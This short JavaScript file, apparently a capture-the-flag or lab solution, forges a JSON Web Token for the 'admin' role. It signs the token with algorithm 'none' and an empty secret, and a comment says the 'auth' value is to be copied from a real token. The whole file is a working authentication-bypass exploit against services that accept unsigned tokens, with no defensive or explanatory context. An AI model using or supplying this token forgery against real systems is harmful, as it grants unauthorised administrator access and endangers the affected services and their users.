const jwt = require('jsonwebtoken');

const generateToken = () => {
  const token = jwt.sign({
    // auth value needs to be the same that the one in original token !
    auth: 1631161444159,
    role: 'admin'
  }, '', { expiresIn: '7d', algorithm: 'none' });
  return token;
};

console.log(generateToken());